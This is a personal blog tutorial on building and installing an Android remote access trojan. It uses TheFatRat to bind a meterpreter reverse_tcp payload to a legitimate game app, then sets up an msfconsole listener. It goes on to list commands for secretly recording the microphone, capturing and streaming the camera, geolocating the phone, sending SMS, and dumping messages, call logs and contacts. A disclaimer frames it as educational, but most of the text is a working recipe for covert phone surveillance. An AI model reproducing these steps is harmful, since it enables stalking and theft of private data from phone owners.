---
title: Trying out an android Remote Access Trojan (RAT)
author: hugo
date: 2023-04-05 09:11:00 +0200
categories: [Tutorial, security]
tags: [hacking, android]
render_with_liquid: false
---


> This tutorial will guide you through the process of infecting Android phones with a trojan. The author gives this example for educational purposes and does not incentivise you to apply these techniques without prior consent
{: .prompt-info }

## The art of deception

_The best defense is a good offense_. Once you're able to write this up and distribute it yourself you'll get a good grasp of how this attack works and what to look out for to stay protected on the internet. Let's define what a trojan is and what we intend to do here today.

<em>In computing, a Trojan horse is any malware that misleads users of its true intent by disguising itself as a real program. The term is derived from the ancient Greek story of the deceptive Trojan Horse that led to the fall of the city of Troy.</em> [`Wikipedia`](https://en.wikipedia.org/wiki/Trojan_horse_(computing)).

To perform this attack you:

1. do not need to "root" your device. You should be able to connect your phone via USB or wifi and drag and drop the executable onto the phone without prior phone configuration.
2. will need to have physical access (pin number) to the phone you're targeting because Android is able to identify it as a trojan and tries to prevent you from installing it.

## Inception

I got inspired to write this blog post after watching a disturbing movie on netflix. "Unlocked" is the story of a korean psychopath who installs malware on a girl's lost cell phone and uses it to track her every move. The movie and the plot were not great but this idea stuck with me. It can't be that easy to install a tracker on a phone? right?

It took me a while to understand what tools and software exist out there. My mind naturally gravitated to the Google store first. I figured that the easiest and frictionless solution you could ever wish for would be on the App store. After some digging I finally discovered Airdroid which provides a lot of those malware features like GPS tracking and screen monitoring. The only two problems I had with it is that it's not a stealth solution, the app notifies the user that it's running on the background, and your data is sent to god knows who's server out there on the internet. I set it upon myself to find "better". A couple of weeks later I came to the realization that all of my deep web searches were in vain and got burnt out from clicking through all the online scams down there. The few forums I actually found looked like they came out from the 1990's which gave me nostalgia and some happy memories of what the early web looked like but ultimately it did not provide any answers.

After a couple of days I finally found the right keyword to search on google and came accross 10 potential candidates for this blog post. My mind finally settled on one called "TheFatRat" and "AndroRat".

## Strategy

Let's review what we are about to do. The plan is to test this malware locally on a virtual android environment and make sure that our server can successfully command and control the android phone. Once that's validated we can increase the complexity by deploying it onto a an actual phone on our local area network. I was planning on showcasing at least four open source projects but ended up only reviewing two of them. The [L3MON](https://github.com/D3VL/L3MON) project vanished from github unfortunately and the [xhunter](https://github.com/anirudhmalik/xhunter) project did not work despite using the release and making sure to use the right Android OS version. It's been quite hard to find anything that (kind of) works so I'm happy to have at least found one open source project that actually applied the malware.

## Configuring and installing

We will be trying out two RATs today: [TheFatRat](https://github.com/screetsec/TheFatRat) and [AndroRAT](https://github.com/karma9874/AndroRAT). Both of which have their pros and cons. 

Starting in second place we have AndroRAT. The advantage of using this RAT is the fact that the author deployed the actual Java code so you're able to modify and understand how it does it's magic. I deployed AndroRAT on one AVD and two actual phones (OS 13 and 6.0.1) and they were all extremely unstable. The RAT successfully spawned a reverse shell on my computer but it would randomly break and I would have to repeat the installation cycle all over again every time. If it wasn't for the transparency I don't think I would have bothered mentioning this program in the first place but I can see potential in it. 

Our clear winner here today is TheFatRat who's functionalities are far and wide. This small executable claims it can take on Windows, Mac, Linux computers as well as android phones. I have yet to fully test and assess these claims but so far I have been blown away by the ease of use and the sheer amount of features this thing has. With our previous RAT we had to install and run a shaddy looking app which does not seem like a credible attack strategy. TheFatRat on the other hand allows us to attach the trojan onto a legitimate app which is how I assume most malware is distributed nowadays. TheFatRat has however a glaring problem which is that it's closed source. The program works thanks to a couple of bash scripts and pre-compiled (c++ code?) but you won't get to see a single line of actual source code which is disappointing to say the least.

Enough talk let's configure and install this software to see what it can do.

```console
    [waz@localhost]# git clone git@github.com:screetsec/TheFatRat.git
    [waz@localhost]# cd TheFatRat
    [waz@localhost]# chmod +x setup.sh && ./setup.sh
```
If the setup fails try running it again, it solved the issue for me as some libraries conflicted with existing ones I had previously installed.

Once the setup is complete you now see a program called _fatrat_ at the root of the project. Run it and it will start the following command line prompt

![FatRat welcome screen](/assets/img/posts/2023-04-05_11-31.png){: width="100%"}

The purpose of this tutorial today is to run an Android trojan so let's choose option number 5. You will then be asked to choose the host ip address, the host's port and the app you want to attach the payload to. I've choosen Flappy bird which I downloaded from APK mirror. The host ip is the IP address of the server that should communicate back with the infected target. Don't forget to allow the servers to communicate on the port you choose to run in your firewall.

![FatRat host configuration](/assets/img/posts/2023-04-05_11-38.jpg){: width="100%"}

Later in the process choose the option 3 "android/meterpreter/reverse_tcp" and then option 3 "Use MsfVenom"

Once configured make sure to add a listener and give it a name, I gave it the name `myratconfig.rc`. This will list out the configuration which will now be used to run our local server. This next command will start listening for incoming HTTP requests 

```console
    [waz@localhost]# msfconsole
```

Now copy paste the contents of `myratconfig.rc` in the console to start listening for incoming requests. The next step is to send the trojan and install it on a device. You can start a local android instance with the following command `./emulator -avd Pixel_API_33` or connect your phone to your computer via USB. Once installed it's you'll have a number of interesting commands at your disposal. You'll notice that the phone does not even need to have the infected app in the background in order to work

Here are the commands I found most interesting:

```console
# record the next 20 seconds activity from the microphone
record_mic -d 20
# send text messages 
send_sms -d +351961234567 -t "GREETINGS SWEETHEART."  
# list available cameras
webcam_list 
# take a picture from the camera s phone
webcam_snap 2
# start streaming the back camera
webcam_stream 
# locate the phone by returning the exact longitude/latitude position
wlan_geolocate -a REPLACE_WITH_YOUR_GOOGLE_API_KEY
# take a screenshot 
screenshot
# copy all of the call logs on the phone
dump_calllog
# copy all of the sms conversations on the phone
dump_sms
# copy all of the contacts on the phone
dump_contacts
```
## Video

I like to add a small clip to showcase what was said so far. Enjoy !

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">

<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/2023-04-05%2022-31-03.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen sandbox></iframe>

</div>

## Conclusion

I started this pen-tester/security journey recently and it feels like oppening a pandora's box. The modern hacker has so many tools available at his disposal and the scary part is that I needed absolutely no programming knowledge to pull this off. A bit of curiosity sprinkled with some persistence here and there did the trick. If this blog post could convey one idea it is this: be extremely careful with the apps you install even when they come from the app store. 

Thank you for reading 

